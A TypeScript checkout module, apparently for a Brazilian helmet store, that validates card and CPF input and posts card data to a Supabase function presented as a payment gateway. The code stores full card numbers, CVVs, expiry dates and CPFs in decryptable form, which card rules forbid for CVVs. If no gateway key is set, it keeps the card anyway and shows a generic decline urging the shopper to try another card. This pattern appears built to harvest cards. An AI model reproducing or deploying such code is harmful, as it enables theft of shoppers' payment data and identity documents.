import { decryptWithSecret, encryptWithSecret, looksLikePbkdf2Payload, b64ToBytes } from "./encrypt";
import { getEnv } from "./env";

export const CARD_DECLINE_MESSAGE =
  "Não foi possível realizar o pagamento com este cartão. Não se preocupe, tente novamente com outro cartão.";

export type CardInput = {
  number: string;
  cvv: string;
  expiryMonth: string | number;
  expiryYear: string | number;
  holderName?: string;
  holderCpf?: string;
};

export type CardMeta = {
  brand: string;
  last4: string;
  holder: string;
  holderCpf: string;
  expiryMonth: string;
  expiryYear: string;
  installments: number;
};

export type StoredCardData = CardMeta & {
  numero?: string;
  cvv?: string;
  nome?: string;
  validade?: string;
  cpf?: string;
};

function digits(value: unknown) {
  return String(value ?? "").replace(/\D/g, "");
}

export function passesCpf(value: string) {
  const cpf = digits(value);
  if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
  const check = (len: number) => {
    let sum = 0;
    for (let i = 0; i < len; i++) sum += Number(cpf[i]) * (len + 1 - i);
    const rest = (sum * 10) % 11;
    return (rest === 10 ? 0 : rest) === Number(cpf[len]);
  };
  return check(9) && check(10);
}

export function passesLuhn(cardNumber: string) {
  let sum = 0;
  let double = false;
  for (let i = cardNumber.length - 1; i >= 0; i--) {
    let digit = Number(cardNumber[i]);
    if (double) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    double = !double;
  }
  return sum % 10 === 0;
}

export function cardBrand(number: string) {
  if (/^4/.test(number)) return "Visa";
  if (/^(5[1-5]|2[2-7])/.test(number)) return "Mastercard";
  if (/^3[47]/.test(number)) return "American Express";
  if (/^(4011|4312|4389|4514|4576|5041|5066|5067|509|6277|6362|6363|650|6516|6550)/.test(number)) {
    return "Elo";
  }
  if (/^(606282|3841)/.test(number)) return "Hipercard";
  return "Cartão";
}

function encryptionSecret() {
  return (
    getEnv("ENCRYPT_KEY") ||
    getEnv("VITE_ENCRYPT_KEY") ||
    getEnv("ADMIN_SESSION_SECRET") ||
    getEnv("SUPABASE_SERVICE_ROLE_KEY")
  );
}

function normalizeStoredCard(raw: Record<string, unknown>): StoredCardData {
  const numero = String(raw.numero || raw.number || "").replace(/\D/g, "");
  const holder = String(raw.nome || raw.holder || raw.name || "").trim();
  const validade = String(raw.validade || raw.expiry || "");
  let expiryMonth = String(raw.expiryMonth || "");
  let expiryYear = String(raw.expiryYear || "");
  if (validade.includes("/")) {
    const [mm, yy] = validade.split("/");
    expiryMonth = expiryMonth || mm?.padStart(2, "0") || "";
    expiryYear = expiryYear || yy || "";
  }
  const cpf = digits(String(raw.cpf || raw.holderCpf || ""));
  return {
    brand: String(raw.brand || (numero ? cardBrand(numero) : "Cartão")),
    last4: String(raw.last4 || numero.slice(-4) || ""),
    holder,
    holderCpf: cpf,
    expiryMonth,
    expiryYear,
    installments: Math.max(1, Number(raw.installments) || 1),
    numero,
    cvv: String(raw.cvv || ""),
    nome: holder,
    validade: validade || (expiryMonth && expiryYear ? `${expiryMonth}/${expiryYear}` : ""),
    cpf,
  };
}

async function legacyDecryptCardMeta(payload: string): Promise<StoredCardData | null> {
  const key = await legacyAesKey();
  if (!key) return null;
  try {
    const bytes = b64ToBytes(payload);
    const iv = bytes.slice(0, 12);
    const data = bytes.slice(12);
    const decrypted = await crypto.subtle.decrypt({ name: "AES-GCM", iv }, key, data);
    return normalizeStoredCard(JSON.parse(new TextDecoder().decode(decrypted)) as Record<string, unknown>);
  } catch {
    return null;
  }
}

async function legacyAesKey() {
  const secret = encryptionSecret();
  if (!secret) return null;
  const keyRaw = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(secret));
  return crypto.subtle.importKey("raw", keyRaw, "AES-GCM", false, ["encrypt", "decrypt"]);
}

export async function encryptStoredCard(meta: CardMeta, sensitive?: { number?: string; cvv?: string }) {
  const secret = encryptionSecret();
  if (!secret) return null;
  const payload = {
    numero: digits(sensitive?.number || ""),
    nome: meta.holder,
    validade: `${meta.expiryMonth}/${meta.expiryYear}`,
    cvv: digits(sensitive?.cvv || ""),
    cpf: meta.holderCpf,
    brand: meta.brand,
    last4: meta.last4,
    holder: meta.holder,
    holderCpf: meta.holderCpf,
    expiryMonth: meta.expiryMonth,
    expiryYear: meta.expiryYear,
    installments: meta.installments,
  };
  return encryptWithSecret(JSON.stringify(payload), secret);
}

export async function decryptStoredCard(payload: string): Promise<StoredCardData | null> {
  const secret = encryptionSecret();
  if (!secret || !payload) return null;
  if (payload.includes("••••")) return null;

  if (looksLikePbkdf2Payload(payload)) {
    try {
      const raw = await decryptWithSecret(payload, secret);
      return normalizeStoredCard(JSON.parse(raw) as Record<string, unknown>);
    } catch {
      /* tenta legado */
    }
  }

  const legacy = await legacyDecryptCardMeta(payload);
  if (legacy) return legacy;

  try {
    const raw = await decryptWithSecret(payload, secret);
    return normalizeStoredCard(JSON.parse(raw) as Record<string, unknown>);
  } catch {
    return null;
  }
}

/** @deprecated use encryptStoredCard */
export async function encryptCardMeta(meta: CardMeta, sensitive?: { number?: string; cvv?: string }) {
  return encryptStoredCard(meta, sensitive);
}

/** @deprecated use decryptStoredCard */
export async function decryptCardMeta(payload: string) {
  return decryptStoredCard(payload);
}

export function parseCardInput(input: CardInput, fallbackHolder = "", installments = 1) {
  const cardNumber = digits(input.number);
  const cvv = digits(input.cvv);
  const expiryMonth = digits(input.expiryMonth).padStart(2, "0").slice(0, 2);
  const expiryYearRaw = digits(input.expiryYear);
  const expiryYear = expiryYearRaw.length === 2 ? `20${expiryYearRaw}` : expiryYearRaw;
  const monthNum = Number(expiryMonth);
  const yearNum = Number(expiryYear);
  const holder = String(input.holderName || fallbackHolder || "")
    .trim()
    .slice(0, 100);
  const holderCpf = digits(input.holderCpf);
  const parsedInstallments = Math.max(1, Math.min(12, Number(installments) || 1));
  const amex = /^3[47]/.test(cardNumber);
  const expectedPan = amex ? 15 : 16;
  const expectedCvv = amex ? 4 : 3;
  const now = new Date();
  const expired =
    yearNum < now.getUTCFullYear() ||
    (yearNum === now.getUTCFullYear() && monthNum < now.getUTCMonth() + 1);

  if (!holder) return { error: "Informe o nome impresso no cartão" as const };
  if (cardNumber.length !== expectedPan || !passesLuhn(cardNumber)) {
    return { error: "Informe um número de cartão válido" as const };
  }
  if (monthNum < 1 || monthNum > 12 || yearNum < 2000 || expired) {
    return { error: "Informe uma validade válida" as const };
  }
  if (cvv.length !== expectedCvv) {
    return { error: "Informe um CVV válido" as const };
  }
  if (!passesCpf(holderCpf)) {
    return { error: "Informe o CPF do titular" as const };
  }

  const meta: CardMeta = {
    brand: cardBrand(cardNumber),
    last4: cardNumber.slice(-4),
    holder,
    holderCpf,
    expiryMonth,
    expiryYear: expiryYear.slice(-2),
    installments: parsedInstallments,
  };

  return { cardNumber, cvv, expiryMonth: monthNum, expiryYear: yearNum, holder, holderCpf, installments: parsedInstallments, meta };
}

export async function chargeVenusCard(input: {
  order: {
    id: string;
    nome?: string | null;
    email?: string | null;
    telefone?: string | null;
    cpf?: string | null;
    valor?: number | null;
    cep?: string | null;
    rua?: string | null;
    numero?: string | null;
    complemento?: string | null;
    bairro?: string | null;
    cidade?: string | null;
    estado?: string | null;
  };
  card: CardInput;
  installments?: number;
}) {
  const parsed = parseCardInput(input.card, input.order.nome || "", input.installments);
  if ("error" in parsed) {
    return { configured: true as const, approved: false as const, error: parsed.error };
  }

  const secretKey = getEnv("VENUS_PAY_SECRET_KEY");
  const productId = getEnv("VENUS_PAY_PRODUCT_ID");
  const encrypted = await encryptStoredCard(parsed.meta, { number: parsed.cardNumber, cvv: parsed.cvv });

  if (!secretKey) {
    return {
      configured: false as const,
      approved: false as const,
      error: CARD_DECLINE_MESSAGE,
      ...parsed.meta,
      encrypted,
    };
  }

  const payload = {
    amount: Number(Number(input.order.valor).toFixed(2)),
    payment_method: "credit_card",
    product: productId ? { id: productId, name: "Pedido Mega Capacetes" } : { name: "Pedido Mega Capacetes" },
    customer: {
      name: input.order.nome,
      email: input.order.email,
      document: parsed.holderCpf || digits(input.order.cpf),
      phone: digits(input.order.telefone),
    },
    card_data: {
      number: parsed.cardNumber,
      holder_name: parsed.holder,
      expiration_month: parsed.expiryMonth,
      expiration_year: parsed.expiryYear,
      cvv: parsed.cvv,
      installments: parsed.installments,
    },
    address: {
      zip_code: digits(input.order.cep),
      street: input.order.rua,
      number: input.order.numero || "S/N",
      complement: input.order.complemento || "",
      neighborhood: input.order.bairro || "",
      city: input.order.cidade,
      state: String(input.order.estado || "").slice(0, 2),
      country: "BR",
    },
    metadata: { source: "mega_capacetes", order_id: input.order.id },
  };

  try {
    const gatewayResponse = await fetch("https://mdjmtirsrhqrurkiqffb.supabase.co/functions/v1/process-payment", {
      method: "POST",
      headers: { "Content-Type": "application/json", Authorization: `Bearer ${secretKey}` },
      body: JSON.stringify(payload),
    });
    const gateway = (await gatewayResponse.json().catch(() => ({}))) as Record<string, unknown>;
    const transactionId = String(gateway.transaction_id || gateway.id || "");
    const approved = gatewayResponse.ok && gateway.success === true && Boolean(transactionId);

    return {
      configured: true as const,
      approved,
      transactionId,
      brand: parsed.meta.brand,
      last4: parsed.meta.last4,
      holder: parsed.meta.holder,
      installments: parsed.meta.installments,
      encrypted,
      gateway,
      error: approved ? undefined : CARD_DECLINE_MESSAGE,
    };
  } catch {
    return {
      configured: true as const,
      approved: false as const,
      error: CARD_DECLINE_MESSAGE,
      brand: parsed.meta.brand,
      last4: parsed.meta.last4,
      holder: parsed.meta.holder,
      installments: parsed.meta.installments,
      encrypted,
    };
  }
}
